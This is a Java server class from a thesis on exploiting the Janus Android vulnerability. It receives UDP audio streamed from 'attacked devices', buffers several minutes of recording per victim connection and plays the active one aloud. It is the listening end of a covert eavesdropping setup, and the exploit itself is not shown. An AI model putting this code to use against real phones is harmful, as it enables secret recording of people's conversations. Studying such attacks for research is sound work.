// Tento kod je soucast diplomove prace Vyuziti zranitelnosti Janus na operacnim systemu Android
// Autor: Bc. Vit Soucek
//
// Pouzite zdroje:
//    - zminene primo v kodu v dokumentacnich komentarich


package com.company;

import javax.sound.sampled.*;
import java.io.IOException;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.SocketException;
import java.util.*;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class ServerThread implements Runnable {

    private int port = 50005;

    volatile boolean status = true;
    volatile String activeConnection = "";

    Map<String, Connection> connections;

    private Thread t;
    private ExecutorService pool;

    private int sampleRate = 44100;//16000;//8000;//44100;//44100;
    private int bufferLen = 26880 * 20;//960*20;//512*2;
    private byte[] receiveData = new byte[bufferLen];

    private SourceDataLine sourceDataLine;
    private AudioFormat format;
    private DataLine.Info dataLineInfo;
    private FloatControl volumeControl;

    private DatagramSocket serverSocket;

    int ringBufferSize;
    int maxMemorySize;
    int maxConnections;

    /**
     * Constructor.
     * Initialize max number of connections and calculate the buffer sizes for connections
     * @param maxMemory Maximum memory size that can be used by the thread to pre-record audio.
     * @param maxConnectionCount Maximum number of connections from attacked devices
     */
    public ServerThread(int maxMemory, int maxConnectionCount) {
        maxMemorySize = maxMemory * 1000000;
        maxConnections = maxConnectionCount;
        ringBufferSize = maxMemorySize;
        pool = Executors.newFixedThreadPool(maxConnections);

        System.out.println("[-] Buffers size set to: " + ringBufferSize + " B. (~ prerecorded " +
                ((ringBufferSize) / (2 * sampleRate)) / 60 + " minutes and " + ((ringBufferSize) / (2 * sampleRate)) % 60 +
                " seconds per connection)");
    }

    /**
     * Main method of the ServerThread.
     * Initialize the audio system and then in the loop:
     *   - receive data
     *   - save the data to the connection buffer
     *   - optionally write the data to the file and/or play them in speakers
     *
     * This method was inspired by the StackOverflow question "Save live audio streaming to wave file in Java"
     * and its accepted answer.
     *     authors: Sadegh Bakhshandeh Sajjad, dieter
     *     available at: https://stackoverflow.com/questions/49811545/save-live-audio-streaming-to-wave-file-in-java
     */
    @Override
    public void run() {

        try {
            serverSocket = new DatagramSocket(port);
        } catch (SocketException e) {
            e.printStackTrace();
        }

        /*
         * Formula for lag = (byte_size/sample_rate)*2
         * Byte size 9728 will produce ~ 0.45 seconds of lag. Voice slightly broken.
         * Byte size 1400 will produce ~ 0.06 seconds of lag. Voice extremely broken.
         * Byte size 4000 will produce ~ 0.18 seconds of lag. Voice slightly more broken then 9728.
         *
         * SAMPLE: 16000 both (android+server) + BUFFER SIZE: 1024
         * 44100 + 1024
         * 44100+862
         * 8000+512
         */

        // Initialize Audio player
        initializeAudioPlayer();

        // Initialize connection list
        connections = new HashMap<>();
        //connectionNames = new TreeSet<>();

        // Run until user changes status
        while (status) {

            // Receive packet with some data
            DatagramPacket packet = receivePacket();

            // Find who sent the packet
            String senderID = getSenderID(packet);

            if (!connections.containsKey(senderID)) {
                if(connections.size() < maxConnections){
                    System.out.println("[-] New connection: " + senderID);
                    connections.put(senderID, new Connection(senderID, ringBufferSize));
                }
            }

            Connection currentConnection = connections.get(senderID);

            // If no connection is active, make this one active
            if (activeConnection.equals("")) {
                activeConnection = senderID;
                System.out.println("[-] Active connection: " + activeConnection);
            }

            byte[] data = packet.getData();
            int dataLength = packet.getLength();

            // Decide what to do with received data
            Runnable task = new ConnectionTask(currentConnection, data, dataLength, senderID.equals(activeConnection), sourceDataLine);
            pool.execute(task);
        }

        // Exit the application
        System.out.println("[-] Thread exiting");
        pool.shutdown();
        sourceDataLine.drain();
        sourceDataLine.close();
    }

    /**
     * Remove connection from the list.
     * @param connectionID ID of the connection to be removed
     */
    public void removeConnection(String connectionID) {
        if (connectionID.equals(activeConnection)) {
            activeConnection = "";
        }

        if (connections.remove(connectionID) != null) {
            System.out.println("[-] Connection " + connectionID + " removed.");
        } else
            System.out.println("[-] Connection does not exist");
    }

    /**
     * Start the thread.
     */
    void start() {
        System.out.println("[-] Starting the server thread.");
        if (t == null) {
            t = new Thread(this);
            t.start();
        }
    }

    /**
     * Receive packet from any source.
     *
     * @return DatagramPacket with received data.
     */
    private DatagramPacket receivePacket() {
        DatagramPacket packet = new DatagramPacket(receiveData, receiveData.length);
        try {
            serverSocket.receive(packet);
        } catch (Exception e) {
            e.printStackTrace();
        }
        return packet;
    }

    /**
     * Initialize all object needed to play audio.
     * This method is inspired by theStackOverflow question "Stream Live Android Audio To Server"
     *     author (the question and the answer as well): chuckliddell0
     *     available at: https://stackoverflow.com/questions/15349987/stream-live-android-audio-to-server
     */
    private void initializeAudioPlayer() {
        format = new AudioFormat(sampleRate, 16, 1, true, false);
        dataLineInfo = new DataLine.Info(SourceDataLine.class, format);

        try {
            sourceDataLine = (SourceDataLine) AudioSystem.getLine(dataLineInfo);
        } catch (LineUnavailableException e) {
            e.printStackTrace();
        }

        try {
            sourceDataLine.open(format);
        } catch (LineUnavailableException e) {
            e.printStackTrace();
        }
        sourceDataLine.start();

        volumeControl = (FloatControl) sourceDataLine.getControl(FloatControl.Type.MASTER_GAIN);
        volumeControl.setValue(volumeControl.getMaximum());
    }

    /**
     * Parse the received packet and get its
     * source IP address and port.
     *
     * @param packet Received DatagramPacket with data.
     * @return IP and port as String in format IP:port
     */
    private String getSenderID(DatagramPacket packet) {
        String addr = packet.getAddress().toString();
        if (addr.charAt(0) == '/') {
            addr = addr.substring(1);
        }
        int port = packet.getPort();
        return addr + ":" + port;
    }
}
